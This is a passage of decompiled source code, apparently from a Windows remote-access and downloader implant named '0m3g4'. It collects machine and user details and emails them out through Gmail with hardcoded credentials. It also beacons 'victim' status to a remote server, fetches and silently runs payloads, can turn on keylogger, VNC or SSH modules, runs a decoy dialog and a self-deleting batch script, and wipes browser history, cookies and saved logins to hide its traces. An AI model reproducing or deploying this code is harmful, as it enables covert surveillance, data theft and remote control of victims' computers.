              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
                goto label_14;
              case 15:
                goto label_15;
              case 16:
                goto label_16;
              case 17:
                goto label_17;
              case 18:
                goto label_18;
              case 19:
                goto label_19;
              case 20:
                goto label_20;
              case 21:
                goto label_21;
              case 22:
                goto label_22;
              case 23:
                goto label_23;
              case 24:
                goto label_24;
              case 25:
                goto label_25;
              case 26:
                goto label_26;
              case 27:
                goto label_27;
              case 28:
                goto label_28;
              case 29:
                goto label_29;
              case 30:
                goto label_30;
              case 31:
                goto label_31;
              case 32:
                goto label_32;
              case 33:
                goto label_39;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_34;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_39:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void ExchangeNotify()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        this.InstalledVer = (string) null;
label_3:
        num3 = 3;
        this.InstalledVer = (string) Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Om3g4", "CurrentVersion", (object) "");
label_4:
        num3 = 4;
        string str1 = "--= Machine Details =--\r\n\r\n*** 0m3g4 Downloader Replacement ***\r\n Old Server: [ 0m3g4-Downloader ]\r\n New Server: [ " + this.ExchangeServer + " ]\r\n\r\n---===========================---\r\n\r\nRegistered Owner: \r\n[ " + this.RegisteredOwner + " ]\r\n\r\nComputer Name: \r\n[ " + Environment.MachineName.ToString() + " ]\r\n\r\nUser Name: \r\n[ " + Environment.UserName.ToString() + " ]\r\n\r\nOperating System Name: \r\n[ " + MyProject.Computer.Info.OSFullName.ToString() + " ]\r\n\r\n---===========================---";
label_5:
        num3 = 5;
        object obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Message"));
label_6:
        num3 = 6;
        object Instance1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Configuration"));
label_7:
        num3 = 7;
        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance1, (System.Type) null, "Fields", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
label_8:
        num3 = 8;
        string str2 = "0m3g4 Downloader \r\nHas  Been Replaced\r\n\r\n" + str1;
label_9:
        num3 = 9;
        string str3 = "0m3g4 <The.0m3g4.Network@gmail.com>";
label_10:
        num3 = 10;
        string str4 = "0m3g4 <The.0m3g4.Network@gmail.com>";
label_11:
        num3 = 11;
        string str5 = "0m3g4 Downloader -= Replacement =-";
label_12:
        num3 = 12;
        string str6 = "http://schemas.microsoft.com/cdo/configuration/";
label_13:
        num3 = 13;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "sendusing"),
          (object) 2
        }, (string[]) null, (System.Type[]) null);
label_14:
        num3 = 14;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpserver"),
          (object) "smtp.gmail.com"
        }, (string[]) null, (System.Type[]) null);
label_15:
        num3 = 15;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpserverport"),
          (object) 465
        }, (string[]) null, (System.Type[]) null);
label_16:
        num3 = 16;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpauthenticate"),
          (object) 1
        }, (string[]) null, (System.Type[]) null);
label_17:
        num3 = 17;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "sendusername"),
          (object) "the.0m3g4.network"
        }, (string[]) null, (System.Type[]) null);
label_18:
        num3 = 18;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "sendpassword"),
          (object) "p1cc1!!o"
        }, (string[]) null, (System.Type[]) null);
label_19:
        num3 = 19;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpusessl"),
          (object) 1
        }, (string[]) null, (System.Type[]) null);
label_20:
        num3 = 20;
        NewLateBinding.LateCall(objectValue, (System.Type) null, "Update", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
label_21:
        num3 = 21;
        object Instance2 = obj;
label_22:
        num3 = 22;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "To", new object[1]
        {
          (object) str3
        }, (string[]) null, (System.Type[]) null);
label_23:
        num3 = 23;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "From", new object[1]
        {
          (object) str4
        }, (string[]) null, (System.Type[]) null);
label_24:
        num3 = 24;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Subject", new object[1]
        {
          (object) str5
        }, (string[]) null, (System.Type[]) null);
label_25:
        num3 = 25;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "TextBody", new object[1]
        {
          (object) str2
        }, (string[]) null, (System.Type[]) null);
label_26:
        num3 = 26;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Sender", new object[1]
        {
          (object) str4
        }, (string[]) null, (System.Type[]) null);
label_27:
        num3 = 27;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Configuration", new object[1]
        {
          RuntimeHelpers.GetObjectValue(Instance1)
        }, (string[]) null, (System.Type[]) null);
label_28:
        num3 = 28;
        Conversions.ToInteger(NewLateBinding.LateGet(Instance2, (System.Type) null, "Send", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
label_29:
        Instance2 = (object) null;
label_30:
        num3 = 30;
        obj = (object) null;
label_31:
        num3 = 31;
        Instance1 = (object) null;
label_32:
        goto label_39;
label_34:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
                goto label_14;
              case 15:
                goto label_15;
              case 16:
                goto label_16;
              case 17:
                goto label_17;
              case 18:
                goto label_18;
              case 19:
                goto label_19;
              case 20:
                goto label_20;
              case 21:
                goto label_21;
              case 22:
                goto label_22;
              case 23:
                goto label_23;
              case 24:
                goto label_24;
              case 25:
                goto label_25;
              case 26:
                goto label_26;
              case 27:
                goto label_27;
              case 28:
                goto label_28;
              case 29:
                goto label_29;
              case 30:
                goto label_30;
              case 31:
                goto label_31;
              case 32:
                goto label_32;
              case 33:
                goto label_39;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_34;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_39:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void SendStatus(string Status)
    {
      TcpClient tcpClient1 = new TcpClient();
      TcpClient tcpClient2 = new TcpClient(this.RemoteNotifier, 11872);
      try
      {
        lock (tcpClient2.GetStream())
        {
          StreamWriter streamWriter = new StreamWriter((Stream) tcpClient2.GetStream());
          streamWriter.Write(Status);
          streamWriter.Flush();
        }
        tcpClient2.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Victim_Online()
    {
      try
      {
        this.SendStatus(Environment.MachineName + "+" + Environment.UserName + "+" + MyProject.Computer.Info.OSFullName + "+" + this.IP + "+" + this.HQUpLinkPort + "+" + this.ServerID + "+Online");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Victim_Offline()
    {
      try
      {
        this.SendStatus(this.IP + "+" + this.ServerID + "+Offline");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Im_Online_Tick(object sender, EventArgs e) => this.Victim_Online();

    private void CheckForUpdate()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        if (!Conversions.ToBoolean(this.NetworkConnectivity))
          goto label_92;
label_3:
        num3 = 5;
        this.ExchangeServer = "0m3g4-Downloader";
label_4:
        num3 = 6;
        string str1 = this.TempFolder + "\\" + this.ExchangeServer + ".txt";
label_5:
        num3 = 7;
        string file1 = this.TempFolder + "\\" + this.ExchangeServer + ".exe";
label_6:
        num3 = 8;
        string file2 = this.TempFolder + "\\" + this.ExchangeServer + ".rar";
label_7:
        num3 = 9;
        string str2 = this.TempFolder + "\\0m3g4-Version.txt";
label_8:
        num3 = 10;
        string str3 = Conversions.ToString(DateAndTime.Now.TimeOfDay.TotalMilliseconds) + ".old";
label_9:
        num3 = 11;
        this.UpToDateVer = (string) null;
label_10:
        num3 = 12;
        if (!MyProject.Computer.FileSystem.FileExists(str1))
          goto label_12;
label_11:
        num3 = 13;
        MyProject.Computer.FileSystem.DeleteFile(str1);
label_12:
        num3 = 15;
        MyProject.Computer.Network.DownloadFile(this.UpdateCheck, str1);
label_13:
        num3 = 16;
        this.UpToDateVer = MyProject.Computer.FileSystem.ReadAllText(str1);
label_14:
        num3 = 17;
        this.NewVer = (string) null;
label_15:
        num3 = 18;
        if (!MyProject.Computer.FileSystem.FileExists(str2))
          goto label_17;
label_16:
        num3 = 19;
        MyProject.Computer.FileSystem.DeleteFile(str2);
label_17:
        num3 = 21;
        MyProject.Computer.Network.DownloadFile(this.UpdateVersion, str2);
label_18:
        num3 = 22;
        this.NewVer = MyProject.Computer.FileSystem.ReadAllText(str2);
label_19:
        num3 = 23;
        this.InstalledVer = (string) null;
label_20:
        num3 = 24;
        this.InstalledVer = (string) Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Om3g4", "CurrentVersion", (object) "");
label_21:
        num3 = 25;
        if (string.IsNullOrEmpty(this.InstalledVer))
          goto label_43;
label_22:
        num3 = 27;
        if (string.IsNullOrEmpty(this.UpToDateVer) | string.IsNullOrEmpty(this.NewVer))
          goto label_92;
label_23:
        num3 = 30;
        if (!(System.IO.File.Exists(str1) & this.UpToDateVer.Contains("Activate: KeyLogger " + this.RegisteredOwner)))
          goto label_27;
label_24:
        num3 = 31;
        this.ExchangeServer = "0m3g4-KeyLogger";
label_25:
        num3 = 32;
        this.ExchangeFile = this.KeyLoggerFile;
label_26:
        num3 = 33;
        this.ServerExchange();
        goto label_43;
label_27:
        num3 = 35;
        if (!(System.IO.File.Exists(str1) & this.UpToDateVer.Contains("Activate: Vnc " + this.RegisteredOwner)))
          goto label_31;
label_28:
        num3 = 36;
        this.ExchangeServer = "0m3g4-Vnc";
label_29:
        num3 = 37;
        this.ExchangeFile = this.VncFile;
label_30:
        num3 = 38;
        this.ServerExchange();
        goto label_43;
label_31:
        num3 = 40;
        if (!(System.IO.File.Exists(str1) & this.UpToDateVer.Contains("Activate: sSH " + this.RegisteredOwner)))
          goto label_35;
label_32:
        num3 = 41;
        this.ExchangeServer = "0m3g4-sSH";
label_33:
        num3 = 42;
        this.ExchangeFile = this.sSHFile;
label_34:
        num3 = 43;
        this.ServerExchange();
        goto label_43;
label_35:
        num3 = 45;
        if (!(System.IO.File.Exists(str1) & this.UpToDateVer.Contains("Self-Destruct: " + this.RegisteredOwner)))
          goto label_37;
label_36:
        num3 = 46;
        this.SelfDestruct();
        goto label_43;
label_37:
        num3 = 48;
        if (System.IO.File.Exists(str1) & this.UpToDateVer.Contains(this.InstalledVer))
          goto label_92;
label_38:
        num3 = 51;
        if (!System.IO.File.Exists(str1) | !System.IO.File.Exists(str2) | this.UpToDateVer.Contains("Update: #"))
          goto label_92;
label_39:
        num3 = 54;
        if (!(System.IO.File.Exists(str1) & System.IO.File.Exists(str2) & this.UpToDateVer.Contains("Update: " + this.RegisteredOwner)))
          goto label_41;
label_40:
        num3 = 55;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Om3g4", true).SetValue("CurrentVersion", (object) this.NewVer);
        goto label_43;
label_41:
        num3 = 57;
        if (!(System.IO.File.Exists(str1) & System.IO.File.Exists(str2) & this.UpToDateVer.Contains("Update: All")))
          goto label_43;
label_42:
        num3 = 58;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Om3g4", true).SetValue("CurrentVersion", (object) this.NewVer);
label_43:
label_44:
        num3 = 60;
        System.IO.File.Move(Application.StartupPath + "\\" + this.appname, this.TempFolder + "\\" + str3);
label_45:
        num3 = 61;
        if (!MyProject.Computer.FileSystem.FileExists(file1))
          goto label_47;
label_46:
        num3 = 62;
        MyProject.Computer.FileSystem.DeleteFile(file1);
label_47:
        num3 = 64;
        if (!MyProject.Computer.FileSystem.FileExists(file2))
          goto label_49;
label_48:
        num3 = 65;
        MyProject.Computer.FileSystem.DeleteFile(file2);
label_49:
        num3 = 67;
        MyProject.Computer.Network.DownloadFile(this.UpdateFile, this.TempFolder + "\\0m3g4-Downloader.rar");
label_50:
        num3 = 68;
        Process process1 = new Process();
label_51:
        num3 = 69;
        string str4 = this.ToolsFolder + "\\rar.exe";
label_52:
        num3 = 70;
        process1.StartInfo.Arguments = "e -pp1cc1!!o " + this.TempFolder + "\\0m3g4-Downloader.rar " + this.TempFolder + "\\";
label_53:
        num3 = 71;
        process1.StartInfo.FileName = str4;
label_54:
        num3 = 72;
        process1.StartInfo.UseShellExecute = false;
label_55:
        num3 = 73;
        process1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
label_56:
        num3 = 74;
        process1.StartInfo.CreateNoWindow = true;
label_57:
        num3 = 75;
        process1.Start();
label_58:
        num3 = 76;
        process1.WaitForExit();
label_59:
        num3 = 77;
        FileInfo fileInfo1 = new FileInfo(this.TempFolder + "\\0m3g4-Downloader.rar");
label_60:
        num3 = 78;
        fileInfo1.Delete();
label_61:
        num3 = 79;
        FileStream fileStream = new FileStream(this.TempFolder + "\\0m3g4-Restart.bat", FileMode.Create, FileAccess.Write);
label_62:
        num3 = 80;
        StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
label_63:
        num3 = 81;
        streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
label_64:
        num3 = 82;
        streamWriter.WriteLine("tskill wscript");
label_65:
        num3 = 83;
        streamWriter.WriteLine("tskill lsess");
label_66:
        num3 = 84;
        streamWriter.WriteLine("tskill svchest");
label_67:
        num3 = 85;
        streamWriter.WriteLine("ping 127.0.0.1 -n 7 >%tmp%\\nul");
label_68:
        num3 = 86;
        streamWriter.WriteLine("del \"" + this.TempFolder + "\\" + str3 + "\"");
label_69:
        num3 = 87;
        streamWriter.WriteLine("ping 127.0.0.1 -n 5 >%tmp%\\nul");
label_70:
        num3 = 88;
        streamWriter.WriteLine("start " + this.TempFolder + "\\0m3g4-Downloader.exe");
label_71:
        num3 = 89;
        streamWriter.WriteLine("ping 127.0.0.1 -n 60 >%tmp%\\nul");
label_72:
        num3 = 90;
        streamWriter.WriteLine("start " + this.PersistentFolder + "\\OverTime.vbs");
label_73:
        num3 = 91;
        streamWriter.WriteLine("del %0");
label_74:
        num3 = 92;
        streamWriter.Close();
label_75:
        num3 = 93;
        this.UpdateNotify();
label_76:
        num3 = 94;
        Process process2 = new Process();
label_77:
        num3 = 95;
        string fileName = this.TempFolder + "\\0m3g4-Restart.bat";
label_78:
        num3 = 96;
        process2.StartInfo.FileName = fileName;
label_79:
        num3 = 97;
        process2.StartInfo.UseShellExecute = false;
label_80:
        num3 = 98;
        process2.StartInfo.CreateNoWindow = true;
label_81:
        num3 = 99;
        process2.Start();
label_82:
        num3 = 100;
        process2.WaitForExit();
label_83:
        num3 = 101;
        FileInfo fileInfo2 = new FileInfo(fileName);
label_84:
        num3 = 102;
        fileInfo2.Delete();
label_85:
        num3 = 103;
        Application.Exit();
        goto label_92;
label_87:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
              case 28:
              case 49:
              case 52:
              case 104:
                goto label_92;
              case 4:
              case 5:
                goto label_3;
              case 6:
                goto label_4;
              case 7:
                goto label_5;
              case 8:
                goto label_6;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 14:
              case 15:
                goto label_12;
              case 16:
                goto label_13;
              case 17:
                goto label_14;
              case 18:
                goto label_15;
              case 19:
                goto label_16;
              case 20:
              case 21:
                goto label_17;
              case 22:
                goto label_18;
              case 23:
                goto label_19;
              case 24:
                goto label_20;
              case 25:
                goto label_21;
              case 26:
              case 29:
              case 34:
              case 39:
              case 44:
              case 47:
              case 50:
              case 53:
              case 56:
              case 59:
                goto label_43;
              case 27:
                goto label_22;
              case 30:
                goto label_23;
              case 31:
                goto label_24;
              case 32:
                goto label_25;
              case 33:
                goto label_26;
              case 35:
                goto label_27;
              case 36:
                goto label_28;
              case 37:
                goto label_29;
              case 38:
                goto label_30;
              case 40:
                goto label_31;
              case 41:
                goto label_32;
              case 42:
                goto label_33;
              case 43:
                goto label_34;
              case 45:
                goto label_35;
              case 46:
                goto label_36;
              case 48:
                goto label_37;
              case 51:
                goto label_38;
              case 54:
                goto label_39;
              case 55:
                goto label_40;
              case 57:
                goto label_41;
              case 58:
                goto label_42;
              case 60:
                goto label_44;
              case 61:
                goto label_45;
              case 62:
                goto label_46;
              case 63:
              case 64:
                goto label_47;
              case 65:
                goto label_48;
              case 66:
              case 67:
                goto label_49;
              case 68:
                goto label_50;
              case 69:
                goto label_51;
              case 70:
                goto label_52;
              case 71:
                goto label_53;
              case 72:
                goto label_54;
              case 73:
                goto label_55;
              case 74:
                goto label_56;
              case 75:
                goto label_57;
              case 76:
                goto label_58;
              case 77:
                goto label_59;
              case 78:
                goto label_60;
              case 79:
                goto label_61;
              case 80:
                goto label_62;
              case 81:
                goto label_63;
              case 82:
                goto label_64;
              case 83:
                goto label_65;
              case 84:
                goto label_66;
              case 85:
                goto label_67;
              case 86:
                goto label_68;
              case 87:
                goto label_69;
              case 88:
                goto label_70;
              case 89:
                goto label_71;
              case 90:
                goto label_72;
              case 91:
                goto label_73;
              case 92:
                goto label_74;
              case 93:
                goto label_75;
              case 94:
                goto label_76;
              case 95:
                goto label_77;
              case 96:
                goto label_78;
              case 97:
                goto label_79;
              case 98:
                goto label_80;
              case 99:
                goto label_81;
              case 100:
                goto label_82;
              case 101:
                goto label_83;
              case 102:
                goto label_84;
              case 103:
                goto label_85;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_87;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_92:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void CheckForUpdates(object sender, EventArgs e) => this.CheckForUpdate();

    private void Decoy()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        if (!(this.appname.Contains("Java") | this.appname.Contains("java") | this.appname.Contains("Access") | this.appname.Contains("Update") | this.appname.Contains("update")))
          goto label_4;
label_3:
        num3 = 3;
        int num4 = (int) MessageBox.Show("    ID Code:\r\n\r\n306d-3367-34", "Update");
label_4:
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private static T InlineAssignHelper<T>(ref T target, T value)
    {
      target = value;
      return value;
    }

    private void TheXFiles()
    {
      byte[] numArray = new byte[1024];
      string str = this.TempFolder + "\\0m3g4-X.exe";
      try
      {
        if (MyProject.Computer.FileSystem.FileExists(str))
          MyProject.Computer.FileSystem.DeleteFile(str);
        int num = 0;
        FileStream fileStream = new FileStream(str, FileMode.OpenOrCreate, FileAccess.Write);
        int target;
        while (Form1.InlineAssignHelper<int>(ref target, this.HQ.GetStream().Read(numArray, 0, numArray.Length)) > 0)
        {
          fileStream.Write(numArray, 0, target);
          checked { num += target; }
        }
        fileStream.Close();
        Thread.Sleep(5000);
        Process.Start(str);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void PowerModeChanged(object sender, PowerModeChangedEventArgs e)
    {
      switch (e.Mode)
      {
        case PowerModes.Resume:
          this.Victim_Online();
          break;
        case PowerModes.Suspend:
          ProjectData.EndApp();
          break;
      }
    }

    private void SessionEnding(object sender, SessionEndingEventArgs e)
    {
      switch (e.Reason)
      {
        case SessionEndReasons.Logoff:
          ProjectData.EndApp();
          break;
        case SessionEndReasons.SystemShutdown:
          ProjectData.EndApp();
          break;
      }
    }

    private void Clear_Internet_Data()
    {
      this.KillProcesses(true, true, true, true, true);
      this.DeleteGoogleChromeData(true);
      this.DeleteMozillaSqlite(true);
      this.DeleteFlashPlayerCookies(true);
      this.DeleteOperaUserData(true);
      this.DeleteSafariUserData(true);
      this.DeleteIEHistory(true);
      this.DeleteIECookies(true);
      this.DeleteIECache(true);
      this.DeleteWinRecent(true);
      this.DeleteWinTemp(true);
      this.DeleteWinIcoCache(true);
      this.DeleteMozillaCache(true);
      this.DeleteMozillaCookies(true);
      this.DeleteMozillaSignons(true);
      this.Clear_All(true);
    }

    [DllImport("shell32.dll")]
    private static extern bool SHGetSpecialFolderPath(
      IntPtr hwndOwner,
      [Out] StringBuilder lpszPath,
      int nFolder,
      bool fCreate);

    public void KillProcesses(
      bool InternetExplorer,
      bool Firefox,
      bool Opera,
      bool Safari,
      bool Chrome)
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        if (Firefox)
        {
          if (process.MainWindowTitle.Contains("Mozilla Firefox"))
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, "firefox", false) == 0)
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, nameof (Firefox), false) == 0)
            process.Kill();
        }
        if (InternetExplorer)
        {
          if (process.MainWindowTitle.Contains("Internet Explorer"))
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, "iexplore", false) == 0)
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, "Iexplore", false) == 0)
            process.Kill();
        }
        if (Opera)
        {
          if (process.MainWindowTitle.Contains(nameof (Opera)))
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, "opera", false) == 0)
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, nameof (Opera), false) == 0)
            process.Kill();
        }
        if (Safari)
        {
          if (process.MainWindowTitle.Contains(nameof (Safari)))
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, nameof (Safari), false) == 0)
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, "safari", false) == 0)
            process.Kill();
        }
        if (Chrome)
        {
          if (process.MainWindowTitle.Contains(nameof (Chrome)))
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, "chrome", false) == 0)
            process.Kill();
          else if (Operators.CompareString(process.ProcessName, nameof (Chrome), false) == 0)
            process.Kill();
        }
        checked { ++index; }
      }
    }

    public void DeleteIEHistory(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.History);
      if (Directory.Exists(folderPath))
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(folderPath))
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(file);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteIECookies(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
      if (Directory.Exists(folderPath))
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(folderPath))
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(file);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteIECache(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
      if (Directory.Exists(folderPath + "\\Content.IE5"))
      {
        try
        {
          foreach (string file in MyProject.Computer.FileSystem.GetFiles(folderPath + "\\Content.IE5"))
          {
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(file);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      try
      {
        foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(folderPath))
        {
          try
          {
            MyProject.Computer.FileSystem.DeleteDirectory(directory, DeleteDirectoryOption.DeleteAllContents);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }

    public void DeleteWinRecent(bool Enable)
    {
      if (!Enable)
        return;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
      try
      {
        foreach (string file in MyProject.Computer.FileSystem.GetFiles(folderPath))
        {
          try
          {
            MyProject.Computer.FileSystem.DeleteFile(file);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      finally
      {
        IEnumerator<string> enumerator;
        enumerator?.Dispose();
      }
    }

    public void DeleteWinTemp(bool Enable)
    {
      if (!Enable)
        return;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache).Remove(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache).LastIndexOf("\\"));
      if (Directory.Exists(str))
      {
        try
        {
          foreach (string directory1 in MyProject.Computer.FileSystem.GetDirectories(str))
          {
            if (!directory1.Substring(checked (directory1.LastIndexOf("\\") + 1)).StartsWith("App"))
            {
              try
              {
                foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory1))
                {
                  try
                  {
                    MyProject.Computer.FileSystem.DeleteFile(file);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                }
              }
              finally
              {
                IEnumerator<string> enumerator;
                enumerator?.Dispose();
              }
              try
              {
                foreach (string directory2 in MyProject.Computer.FileSystem.GetDirectories(directory1))
                {
                  try
                  {
                    MyProject.Computer.FileSystem.DeleteDirectory(directory2, DeleteDirectoryOption.DeleteAllContents);
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                }
              }
              finally
              {
                IEnumerator<string> enumerator;
                enumerator?.Dispose();
              }
              try
              {
                MyProject.Computer.FileSystem.DeleteDirectory(directory1, DeleteDirectoryOption.DeleteAllContents);
                MyProject.Computer.FileSystem.CreateDirectory(directory1);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
    }

    public void DeleteWinIcoCache(bool Enable)
    {
      if (!Enable)
        return;
      Form1.SHGetSpecialFolderPath(IntPtr.Zero, this.path, 28, false);
      string str = this.path.ToString();
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(str + "\\IconCache.db");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("shell32.dll", EntryPoint = "SHEmptyRecycleBinA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SHEmptyRecycleBin(int hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszRootPath, int dwFlags);

    [DllImport("shell32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SHUpdateRecycleBinIcon();

    private void DeleteWinRecycleBin(bool Enable)
    {
      if (!Enable)
        return;
      int int32 = this.Handle.ToInt32();
      string str = (string) null;
      ref string local = ref str;
      Form1.SHEmptyRecycleBin(int32, ref local, 7);
      Form1.SHUpdateRecycleBinIcon();
    }

    public void DeleteMozillaCookies(bool Enable)
    {
      if (!Enable)
        return;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      if (Directory.Exists(str))
      {
        try
        {
          foreach (string directory in MyProject.Computer.FileSystem.GetDirectories(str))
          {
            try
            {
              foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory))
              {
